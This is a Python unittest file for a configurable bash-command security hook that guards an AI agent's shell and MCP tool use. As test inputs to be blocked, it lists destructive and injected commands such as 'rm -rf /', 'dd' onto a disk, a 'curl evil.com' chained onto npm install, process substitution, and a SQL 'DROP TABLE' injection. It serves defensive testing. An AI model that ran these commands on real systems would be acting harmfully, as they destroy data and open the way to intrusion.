"""
Security Hook Tests
===================

Tests for configurable bash command security validation.
"""

import asyncio
import unittest
from typing import cast

from claude_agent_sdk import HookInput

from agent_harness.config import BashSecurityConfig, ExtraValidatorConfig
from agent_harness.security import (
    _check_command_substitution,
    create_bash_security_hook,
    create_mcp_tool_hook,
    extract_commands,
    split_command_segments,
    strip_balanced_parens,
    validate_chmod_command,
    validate_git_command,
    validate_init_script,
    validate_pkill_command,
)


# Build a config matching the original demo's allowlist
DEMO_BASH_CONFIG = BashSecurityConfig(
    allowed_commands=[
        "ls", "cat", "head", "tail", "wc", "grep",
        "cp", "mkdir", "chmod",
        "pwd",
        "npm", "node",
        "git",
        "ps", "lsof", "sleep", "pkill",
        "init.sh",
    ],
    extra_validators={
        "pkill": ExtraValidatorConfig(
            allowed_targets=["node", "npm", "npx", "vite", "next"]
        ),
        "chmod": ExtraValidatorConfig(
            allowed_modes=["+x", "u+x", "a+x"]
        ),
    },
)


class TestSecurity(unittest.TestCase):
    """Tests for bash command security validation."""

    def setUp(self) -> None:
        self.hook = create_bash_security_hook(DEMO_BASH_CONFIG)

    def _assert_hook(self, command: str, expected_decision: str) -> None:
        """Run the security hook and assert the decision."""
        input_data = cast(
            HookInput, {"tool_name": "Bash", "tool_input": {"command": command}}
        )
        result = asyncio.run(self.hook(input_data, None, None))
        actual_decision = result.get("decision", "allow")
        self.assertEqual(
            actual_decision,
            expected_decision,
            f"Command {command!r}: expected {expected_decision!r}, "
            f"got {actual_decision!r} (reason: {result.get('reason', '')})",
        )

    def test_extract_commands(self) -> None:
        """Test the command extraction logic."""
        test_cases = [
            ("ls -la", ["ls"]),
            ("npm install && npm run build", ["npm", "npm"]),
            ("cat file.txt | grep pattern", ["cat", "grep"]),
            ("/usr/bin/node script.js", ["node"]),
            ("VAR=value ls", ["ls"]),
            ("git status || git init", ["git", "git"]),
        ]

        for cmd, expected in test_cases:
            with self.subTest(cmd=cmd):
                self.assertEqual(extract_commands(cmd), expected)

    def test_validate_chmod(self) -> None:
        """Test chmod command validation."""
        test_cases = [
            ("chmod +x init.sh", True, "basic +x"),
            ("chmod +x script.sh", True, "+x on any script"),
            ("chmod u+x init.sh", True, "user +x"),
            ("chmod a+x init.sh", True, "all +x"),
            ("chmod ug+x init.sh", True, "user+group +x"),
            ("chmod +x file1.sh file2.sh", True, "multiple files"),
            ("chmod 777 init.sh", False, "numeric mode"),
            ("chmod 755 init.sh", False, "numeric mode 755"),
            ("chmod +w init.sh", False, "write permission"),
            ("chmod +r init.sh", False, "read permission"),
            ("chmod -x init.sh", False, "remove execute"),
            ("chmod -R +x dir/", False, "recursive flag"),
            ("chmod --recursive +x dir/", False, "long recursive flag"),
            ("chmod +x", False, "missing file"),
        ]

        for cmd, should_allow, description in test_cases:
            with self.subTest(cmd=cmd, description=description):
                allowed, _ = validate_chmod_command(cmd, ["+x", "u+x", "a+x"])
                self.assertEqual(allowed, should_allow)

    def test_validate_chmod_custom_modes(self) -> None:
        """Test chmod validation respects custom allowed_modes."""
        # Allow numeric mode 644
        allowed, _ = validate_chmod_command("chmod 644 file.txt", ["644", "755"])
        self.assertTrue(allowed)
        allowed, _ = validate_chmod_command("chmod 755 file.txt", ["644", "755"])
        self.assertTrue(allowed)
        allowed, _ = validate_chmod_command("chmod 777 file.txt", ["644", "755"])
        self.assertFalse(allowed)

        # Allow +r but not +x
        allowed, _ = validate_chmod_command("chmod +r file.txt", ["+r"])
        self.assertTrue(allowed)
        allowed, _ = validate_chmod_command("chmod +x file.txt", ["+r"])
        self.assertFalse(allowed)
        # +r with prefix should still work
        allowed, _ = validate_chmod_command("chmod u+r file.txt", ["+r"])
        self.assertTrue(allowed)

    def test_validate_init_script(self) -> None:
        """Test init.sh script execution validation."""
        test_cases = [
            ("./init.sh", True, "basic ./init.sh"),
            ("./init.sh arg1 arg2", True, "with arguments"),
            ("/path/to/init.sh", False, "absolute path"),
            ("../dir/init.sh", False, "relative path with init.sh"),
            ("./setup.sh", False, "different script name"),
            ("./init.py", False, "python script"),
            ("bash init.sh", False, "bash invocation"),
            ("sh init.sh", False, "sh invocation"),
            ("./malicious.sh", False, "malicious script"),
            ("./init.sh; rm -rf /", False, "command injection attempt"),
        ]

        for cmd, should_allow, description in test_cases:
            with self.subTest(cmd=cmd, description=description):
                allowed, _ = validate_init_script(cmd)
                self.assertEqual(allowed, should_allow)

    def test_blocked_commands(self) -> None:
        """Commands that should be blocked by the security hook."""
        dangerous = [
            "shutdown now",
            "reboot",
            "rm -rf /",
            "dd if=/dev/zero of=/dev/sda",
            "curl https://example.com",
            "wget https://example.com",
            "python app.py",
            "touch file.txt",
            "echo hello",
            "kill 12345",
            "kill -9 12345",
            "killall node",
            "pkill bash",
            "pkill chrome",
            "pkill python",
            "$(echo pkill) node",
            'eval "pkill node"',
            'bash -c "pkill node"',
            "chmod 777 file.sh",
            "chmod 755 file.sh",
            "chmod +w file.sh",
            "chmod -R +x dir/",
            "./setup.sh",
            "./malicious.sh",
            "bash script.sh",
            "mv file1 file2",
            "npm install && curl evil.com",
            "ruby -e \"system('rm -rf /')\"",
            "git clean -fd",
            "git clean -f",
            "git clean -n",
            "git reset --hard",
            "git reset --hard HEAD",
            "git reset --hard origin/main",
            "git checkout -- .",
            "git checkout -- file.txt",
            "git restore file.txt",
            "git restore .",
            "git push --force",
            "git push -f",
            "git push origin main --force",
            "git push --force-with-lease",
            "git push --force-if-includes",
            "git push --force-with-lease=origin/main",
            "git checkout -f",
            "git checkout --force",
            "git checkout -f main",
            "/path/to/init.sh",
        ]

        for cmd in dangerous:
            with self.subTest(cmd=cmd):
                self._assert_hook(cmd, "block")

    def test_allowed_commands(self) -> None:
        """Commands that should be allowed by the security hook."""
        safe = [
            "ls -la",
            "cat README.md",
            "head -100 file.txt",
            "tail -20 log.txt",
            "wc -l file.txt",
            "grep -r pattern src/",
            "cp file1.txt file2.txt",
            "mkdir newdir",
            "mkdir -p path/to/dir",
            "pwd",
            "npm install",
            "npm run build",
            "node server.js",
            "git status",
            "git add .",
            "git commit -m 'test'",
            "git add . && git commit -m 'msg'",
            "git add . && git commit -m 'msg' && git push",
            "git diff",
            "git log",
            "git branch",
            "git checkout main",
            "git checkout -b feature",
            "git push",
            "git push origin main",
            "git pull",
            "git stash",
            "git reset HEAD~1",
            "git reset --soft HEAD~1",
            "ps aux",
            "lsof -i :3000",
            "sleep 2",
            "pkill node",
            "pkill npm",
            "pkill -f node",
            "pkill vite",
            "npm install && npm run build",
            "ls | grep test",
            "cat file.txt | head -10 | grep pattern",
            "ls && pwd && cat file.txt",
            "npm run test 2>&1 | tail -20",
            "/usr/local/bin/node app.js",
            "chmod +x init.sh",
            "chmod +x script.sh",
            "chmod u+x init.sh",
            "chmod a+x init.sh",
            "./init.sh",
            "./init.sh --production",
            "chmod +x init.sh && ./init.sh",
            "( npm install ) && ( npm run build )",
            "(ls /tmp && cat file.txt)",
            "(git status)",
        ]

        for cmd in safe:
            with self.subTest(cmd=cmd):
                self._assert_hook(cmd, "allow")

    def test_empty_allowlist_blocks_everything(self) -> None:
        """An empty allowlist should block all commands."""
        empty_config = BashSecurityConfig(allowed_commands=[], extra_validators={})
        hook = create_bash_security_hook(empty_config)
        input_data = cast(
            HookInput, {"tool_name": "Bash", "tool_input": {"command": "ls"}}
        )
        result = asyncio.run(hook(input_data, None, None))
        self.assertEqual(result.get("decision"), "block")

    def test_custom_allowlist(self) -> None:
        """A custom allowlist should only allow specified commands."""
        custom_config = BashSecurityConfig(
            allowed_commands=["python", "pip"],
            extra_validators={},
        )
        hook = create_bash_security_hook(custom_config)

        # python should be allowed
        input_data = cast(
            HookInput, {"tool_name": "Bash", "tool_input": {"command": "python app.py"}}
        )
        result = asyncio.run(hook(input_data, None, None))
        self.assertEqual(result.get("decision", "allow"), "allow")

        # npm should be blocked
        input_data = cast(
            HookInput, {"tool_name": "Bash", "tool_input": {"command": "npm install"}}
        )
        result = asyncio.run(hook(input_data, None, None))
        self.assertEqual(result.get("decision"), "block")

    def test_unparseable_command_blocked(self) -> None:
        """Commands with unmatched quotes should be blocked, not allowed."""
        unparseable_cmds = [
            "echo 'unmatched quote",
            'cat "missing end',
            "ls 'half",
        ]
        for cmd in unparseable_cmds:
            with self.subTest(cmd=cmd):
                self._assert_hook(cmd, "block")

    def test_extract_commands_unparseable_returns_sentinel(self) -> None:
        """extract_commands should return a sentinel for unparseable input."""
        result = extract_commands("echo 'unmatched")
        self.assertEqual(result, ["__UNPARSEABLE__"])

    def test_validate_pkill_with_custom_targets(self) -> None:
        """pkill validation should use configured targets."""
        allowed, _ = validate_pkill_command("pkill python", ["python", "java"])
        self.assertTrue(allowed)
        allowed, _ = validate_pkill_command("pkill node", ["python", "java"])
        self.assertFalse(allowed)

    def test_validate_pkill_shlex_split_output(self) -> None:
        """pkill validation with shlex.split output - exact match only."""
        # After removing dead code, we do exact matching on the target
        # No special handling for space-separated patterns
        test_cases = [
            ("pkill node", ["node"], True),
            ("pkill -f node", ["node"], True),
            ("pkill -9 node", ["node"], True),
            # Quoted strings with spaces require exact match (no first-word extraction)
            ("pkill -f 'node server.js'", ["node server.js"], True),
            ("pkill -f 'node server.js'", ["node"], False),  # Not just first word
            ("pkill python", ["node"], False),
            ("pkill -9 python", ["node"], False),
        ]
        for cmd, allowed_targets, should_allow in test_cases:
            with self.subTest(cmd=cmd):
                allowed, _ = validate_pkill_command(cmd, allowed_targets)
                self.assertEqual(allowed, should_allow)

    def test_validate_git_allowed(self) -> None:
        """Test git commands that should be allowed."""
        allowed_cmds = [
            "git status",
            "git add .",
            "git commit -m 'message'",
            "git diff",
            "git log",
            "git branch",
            "git checkout main",
            "git checkout -b feature",
            "git push",
            "git push origin main",
            "git pull",
            "git stash",
            "git reset HEAD~1",
            "git reset --soft HEAD~1",
        ]

        for cmd in allowed_cmds:
            with self.subTest(cmd=cmd):
                allowed, _ = validate_git_command(cmd)
                self.assertTrue(allowed, f"{cmd} should be allowed")

    def test_validate_git_blocked(self) -> None:
        """Test git commands that should be blocked."""
        blocked_cmds = [
            ("git clean", "removes untracked files"),
            ("git clean -f", "removes untracked files"),
            ("git clean -fd", "removes untracked files"),
            ("git reset --hard", "discards all changes"),
            ("git reset --hard HEAD", "discards all changes"),
            ("git reset --hard origin/main", "discards all changes"),
            ("git checkout -- file.txt", "discards changes"),
            ("git checkout -- .", "discards changes"),
            ("git push --force", "overwrites remote history"),
            ("git push -f", "overwrites remote history"),
            ("git push origin main --force", "overwrites remote history"),
            ("git push origin main -f", "overwrites remote history"),
            ("git push --force-with-lease", "overwrites remote history"),
            ("git push --force-if-includes", "overwrites remote history"),
            ("git push --force-with-lease=origin/main", "overwrites remote history"),
        ]

        for cmd, reason_fragment in blocked_cmds:
            with self.subTest(cmd=cmd):
                allowed, reason = validate_git_command(cmd)
                self.assertFalse(allowed, f"{cmd} should be blocked")
                self.assertIn(reason_fragment, reason.lower())

    def test_strip_balanced_parens(self) -> None:
        """Test balanced parenthesis stripping."""
        # Balanced parens should be stripped
        self.assertEqual(strip_balanced_parens("(ls)"), "ls")
        self.assertEqual(strip_balanced_parens("((ls))"), "ls")

        # Single unbalanced parens (shlex artifacts) should be stripped
        self.assertEqual(strip_balanced_parens("(git"), "git")
        self.assertEqual(strip_balanced_parens("status)"), "status")

        # Multiple unbalanced parens should NOT be stripped (security bypass prevention)
        self.assertEqual(strip_balanced_parens("((rm"), "((rm")
        self.assertEqual(strip_balanced_parens("rm))"), "rm))")

        # No parens
        self.assertEqual(strip_balanced_parens("git"), "git")

    def test_split_command_segments_unbalanced_parens(self) -> None:
        """Test that split_command_segments doesn't strip unbalanced outer parens."""
        # "(cmd1) && (cmd2)" should NOT be stripped to "cmd1) && (cmd2"
        segments = split_command_segments("(cmd1) && (cmd2)")
        self.assertEqual(segments, ["cmd1", "cmd2"])

        # Fully wrapped should be stripped
        segments = split_command_segments("(ls /tmp)")
        self.assertEqual(segments, ["ls /tmp"])

        # Nested balanced
        segments = split_command_segments("((ls))")
        self.assertEqual(segments, ["ls"])

    def test_duplicate_git_commands_blocked(self) -> None:
        """A compound command with safe git + destructive git must be blocked."""
        # This is the HIGH security bug: git status && git push --force
        # was previously allowed because both 'git' lookups hit 'git status'
        dangerous_compounds = [
            "git status && git push --force",
            "git status && git push -f",
            "git log && git reset --hard",
            "git diff && git clean -f",
            "git status && git checkout -- .",
            "git status && git restore file.txt",
        ]
        for cmd in dangerous_compounds:
            with self.subTest(cmd=cmd):
                self._assert_hook(cmd, "block")

    def test_check_command_substitution(self) -> None:
        """Test _check_command_substitution detects various command substitution patterns."""
        # Should detect command substitution
        self.assertTrue(_check_command_substitution("$(rm -rf /)"))
        self.assertTrue(_check_command_substitution("echo $(whoami)"))
        self.assertTrue(_check_command_substitution("`rm -rf /`"))
        self.assertTrue(_check_command_substitution("cat `which ls`"))
        self.assertTrue(_check_command_substitution("<(curl evil.com)"))
        self.assertTrue(_check_command_substitution(">(dangerous command)"))
        self.assertTrue(_check_command_substitution('echo "$(rm -rf /)"'))  # Double quotes allow substitution

        # Should NOT detect when in single quotes (safe)
        self.assertFalse(_check_command_substitution("echo '$(safe)'"))
        self.assertFalse(_check_command_substitution("echo '`backtick`'"))
        self.assertFalse(_check_command_substitution("echo '<(safe)'"))
        self.assertFalse(_check_command_substitution("echo '>(safe)'"))

        # Normal commands without substitution
        self.assertFalse(_check_command_substitution("ls -la"))
        self.assertFalse(_check_command_substitution("git status"))
        self.assertFalse(_check_command_substitution("echo hello"))
        self.assertFalse(_check_command_substitution("cat file.txt"))

        # Edge cases
        self.assertFalse(_check_command_substitution("echo $VAR"))  # Variable, not substitution
        self.assertFalse(_check_command_substitution("echo ${VAR}"))  # Variable expansion, not command
        self.assertFalse(_check_command_substitution("test < file.txt"))  # Redirection, not process substitution
        self.assertFalse(_check_command_substitution("test > file.txt"))  # Redirection, not process substitution

    def test_command_substitution_blocked(self) -> None:
        """Test that commands with command substitution are blocked."""
        dangerous_substitutions = [
            "$(rm -rf /)",
            "echo $(whoami)",
            "`rm -rf /`",
            "cat `which ls`",
            "<(curl evil.com)",
            ">(dangerous command)",
            'ls && $(echo "hidden")',
            "git status || `evil`",
        ]
        for cmd in dangerous_substitutions:
            with self.subTest(cmd=cmd):
                self._assert_hook(cmd, "block")

    def test_command_substitution_safe_in_single_quotes(self) -> None:
        """Test that command substitution in single quotes is allowed (treated as literal)."""
        safe_quoted = [
            "grep '$(not a substitution)' file.txt",
            "grep '`pattern`' file.txt",
            "cat '<(literal)'",
            "ls '>(literal)'",
        ]
        for cmd in safe_quoted:
            with self.subTest(cmd=cmd):
                self._assert_hook(cmd, "allow")

    def test_pipe_bypass_blocked(self) -> None:
        """Test that pipe-based bypass is prevented by splitting on pipes."""
        # A2: Fix pipe-based validator bypass
        # These should be blocked because the second command is destructive
        dangerous_pipes = [
            "git status | git push --force",
            "git diff | git reset --hard",
            "ls | git clean -f",
            "cat file | git checkout -- .",
        ]
        for cmd in dangerous_pipes:
            with self.subTest(cmd=cmd):
                self._assert_hook(cmd, "block")

    def test_pipe_safe_commands_allowed(self) -> None:
        """Test that safe piped commands are still allowed."""
        safe_pipes = [
            "ls | grep test",
            "cat file.txt | head -10",
            "git log | grep fix",
            "git diff | wc -l",
            "ps aux | grep node",
        ]
        for cmd in safe_pipes:
            with self.subTest(cmd=cmd):
                self._assert_hook(cmd, "allow")

    def test_git_push_force_with_lease_blocked(self) -> None:
        """git push --force-with-lease should be blocked."""
        allowed, reason = validate_git_command("git push --force-with-lease")
        self.assertFalse(allowed)
        self.assertIn("force push", reason.lower())

    def test_git_push_force_if_includes_blocked(self) -> None:
        """git push --force-if-includes should be blocked."""
        allowed, reason = validate_git_command("git push --force-if-includes")
        self.assertFalse(allowed)
        self.assertIn("force push", reason.lower())

    def test_git_push_force_with_lease_equals_blocked(self) -> None:
        """git push --force-with-lease=origin/main should be blocked."""
        allowed, reason = validate_git_command("git push --force-with-lease=origin/main")
        self.assertFalse(allowed)
        self.assertIn("force push", reason.lower())

    def test_validate_git_restore_blocked(self) -> None:
        """git restore should be blocked (modern equivalent of git checkout --)."""
        blocked_cmds = [
            "git restore file.txt",
            "git restore .",
            "git restore --staged file.txt",
        ]
        for cmd in blocked_cmds:
            with self.subTest(cmd=cmd):
                allowed, reason = validate_git_command(cmd)
                self.assertFalse(allowed, f"{cmd} should be blocked")
                self.assertIn("restore", reason.lower())

    def test_validate_git_checkout_force_blocked(self) -> None:
        """git checkout -f and --force should be blocked (discards uncommitted changes)."""
        blocked_cmds = [
            ("git checkout -f", "discards uncommitted changes"),
            ("git checkout --force", "discards uncommitted changes"),
            ("git checkout -f main", "discards uncommitted changes"),
            ("git checkout --force main", "discards uncommitted changes"),
        ]
        for cmd, reason_fragment in blocked_cmds:
            with self.subTest(cmd=cmd):
                allowed, reason = validate_git_command(cmd)
                self.assertFalse(allowed, f"{cmd} should be blocked")
                self.assertIn(reason_fragment, reason.lower())

    def test_validate_init_script_rejects_arbitrary_paths(self) -> None:
        """validate_init_script should only accept ./init.sh, not arbitrary paths."""
        # These should be rejected (tightened from the old behavior)
        rejected = [
            "/tmp/evil/init.sh",
            "/path/to/init.sh",
            "../dir/init.sh",
        ]
        for cmd in rejected:
            with self.subTest(cmd=cmd):
                allowed, _ = validate_init_script(cmd)
                self.assertFalse(allowed, f"{cmd} should be rejected")

    def test_create_mcp_tool_hook(self) -> None:
        """Test MCP tool hook creation and validation."""
        # Test blocked patterns
        hook = create_mcp_tool_hook("test_tool", {"blocked_patterns": [r"rm -rf", r"--force"]})

        # Should allow safe input
        result = asyncio.run(hook(cast(HookInput, {
            "tool_name": "test_tool",
            "tool_input": {"command": "safe command"}
        })))
        self.assertEqual(result.get("decision", "allow"), "allow")

        # Should block dangerous input
        result = asyncio.run(hook(cast(HookInput, {
            "tool_name": "test_tool",
            "tool_input": {"command": "rm -rf /"}
        })))
        self.assertEqual(result.get("decision"), "block")

        # Test allowed_args
        hook = create_mcp_tool_hook("test_tool", {"allowed_args": ["status", "list"]})

        # Should allow whitelisted action
        result = asyncio.run(hook(cast(HookInput, {
            "tool_name": "test_tool",
            "tool_input": {"action": "status"}
        })))
        self.assertEqual(result.get("decision", "allow"), "allow")

        # Should block non-whitelisted action
        result = asyncio.run(hook(cast(HookInput, {
            "tool_name": "test_tool",
            "tool_input": {"action": "delete"}
        })))
        self.assertEqual(result.get("decision"), "block")


class TestMcpToolHookExpanded(unittest.TestCase):
    """Expanded tests for MCP tool hook."""

    def test_blocked_pattern_matching(self) -> None:
        """Blocked patterns should match anywhere in the input."""
        hook = create_mcp_tool_hook("my_tool", {"blocked_patterns": [r"DROP\s+TABLE"]})
        # Should block
        result = asyncio.run(hook(cast(HookInput, {
            "tool_name": "my_tool",
            "tool_input": {"query": "SELECT 1; DROP TABLE users"}
        })))
        self.assertEqual(result.get("decision"), "block")
        # Should allow
        result = asyncio.run(hook(cast(HookInput, {
            "tool_name": "my_tool",
            "tool_input": {"query": "SELECT * FROM users"}
        })))
        self.assertEqual(result.get("decision", "allow"), "allow")

    def test_allowed_args_restriction(self) -> None:
        """Only whitelisted actions should be allowed."""
        hook = create_mcp_tool_hook("my_tool", {"allowed_args": ["read", "list"]})
        # Allowed
        result = asyncio.run(hook(cast(HookInput, {
            "tool_name": "my_tool",
            "tool_input": {"action": "read"}
        })))
        self.assertEqual(result.get("decision", "allow"), "allow")
        # Blocked
        result = asyncio.run(hook(cast(HookInput, {
            "tool_name": "my_tool",
            "tool_input": {"action": "write"}
        })))
        self.assertEqual(result.get("decision"), "block")

    def test_tool_name_mismatch_returns_empty(self) -> None:
        """Hook should return empty dict for mismatched tool names."""
        hook = create_mcp_tool_hook("my_tool", {"blocked_patterns": [r".*"]})
        result = asyncio.run(hook(cast(HookInput, {
            "tool_name": "other_tool",
            "tool_input": {"command": "anything"}
        })))
        self.assertEqual(result, {})

    def test_multiple_blocked_patterns(self) -> None:
        """All blocked patterns should be checked."""
        hook = create_mcp_tool_hook("my_tool", {
            "blocked_patterns": [r"DELETE", r"UPDATE", r"INSERT"]
        })
        for keyword in ["DELETE", "UPDATE", "INSERT"]:
            with self.subTest(keyword=keyword):
                result = asyncio.run(hook(cast(HookInput, {
                    "tool_name": "my_tool",
                    "tool_input": {"query": f"{keyword} FROM users"}
                })))
                self.assertEqual(result.get("decision"), "block")

    def test_case_insensitive_matching(self) -> None:
        """Blocked patterns should match case-insensitively."""
        hook = create_mcp_tool_hook("my_tool", {"blocked_patterns": [r"drop table"]})
        result = asyncio.run(hook(cast(HookInput, {
            "tool_name": "my_tool",
            "tool_input": {"query": "DROP TABLE users"}
        })))
        self.assertEqual(result.get("decision"), "block")

    def test_command_param_for_allowed_args(self) -> None:
        """allowed_args should also check 'command' parameter."""
        hook = create_mcp_tool_hook("my_tool", {"allowed_args": ["status"]})
        # Using "command" param instead of "action"
        result = asyncio.run(hook(cast(HookInput, {
            "tool_name": "my_tool",
            "tool_input": {"command": "status"}
        })))
        self.assertEqual(result.get("decision", "allow"), "allow")
        result = asyncio.run(hook(cast(HookInput, {
            "tool_name": "my_tool",
            "tool_input": {"command": "delete"}
        })))
        self.assertEqual(result.get("decision"), "block")

    def test_no_restrictions_allows_all(self) -> None:
        """Hook with no restrictions should allow everything."""
        hook = create_mcp_tool_hook("my_tool", {})
        result = asyncio.run(hook(cast(HookInput, {
            "tool_name": "my_tool",
            "tool_input": {"command": "rm -rf /"}
        })))
        self.assertEqual(result.get("decision", "allow"), "allow")

    def test_json_dumps_pattern_matching(self) -> None:
        """MCP hook should use json.dumps for reliable pattern matching."""
        # Test with nested objects and special characters that str() might handle differently
        hook = create_mcp_tool_hook("my_tool", {"blocked_patterns": [r'"dangerous_key":\s*true']})

        # Should block when pattern matches JSON structure
        result = asyncio.run(hook(cast(HookInput, {
            "tool_name": "my_tool",
            "tool_input": {"dangerous_key": True, "other": "value"}
        })))
        self.assertEqual(result.get("decision"), "block")

        # Should allow when pattern doesn't match
        result = asyncio.run(hook(cast(HookInput, {
            "tool_name": "my_tool",
            "tool_input": {"safe_key": True, "other": "value"}
        })))
        self.assertEqual(result.get("decision", "allow"), "allow")


if __name__ == "__main__":
    unittest.main()
